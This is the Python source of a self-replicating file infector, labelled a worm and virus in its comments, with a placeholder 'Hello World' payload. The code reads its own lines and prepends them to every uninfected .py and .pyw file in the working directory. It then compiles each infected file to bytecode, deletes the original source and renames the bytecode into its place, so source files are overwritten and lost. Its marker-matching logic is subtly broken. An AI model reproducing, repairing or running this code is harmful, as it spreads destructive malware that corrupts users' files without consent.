"#START COPY"

import sys
import glob
import os
import py_compile

# variable that contains the worms code
worm_code = []

# opens the current file and read the lines
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

#Code that copies itself
copy = False
for line in lines:
    if line == "#START COPY":
        copy = True
    if not copy:
        worm_code.append(line)
    if line == "#END COPY":
        break

#selects files which need to be corrupted
corrupt_files = glob.glob('*.py') + glob.glob('*.pyw')

#Corrupts the files
for file in corrupt_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    
    infected = False

    for line in file_code:
        if line == "#START COPY":
            infected = True
            break
    
    if not infected:
        final_code = []
        final_code.extend(worm_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)
        
        #add basic obfuscation by compiling to byte code
        directory = os.path.dirname(file)
        # Compile the Python file to bytecode
        py_compile.compile(file)

        # Rename the compiled bytecode file to be the same as it started
        bytecode_file = file
        compiled_file = os.path.join(directory, "__pycache__", os.path.basename(file).replace(".py", ".cpython-310.pyc"))
        # Remove orgiinal file and place infected file at its place
        os.remove(file)
        os.rename(compiled_file, bytecode_file)
        os.rmdir(os.path.join(directory, "__pycache__"))

#contains the actual virus
def virus_function():
    print("Hello World")

"#END COPY"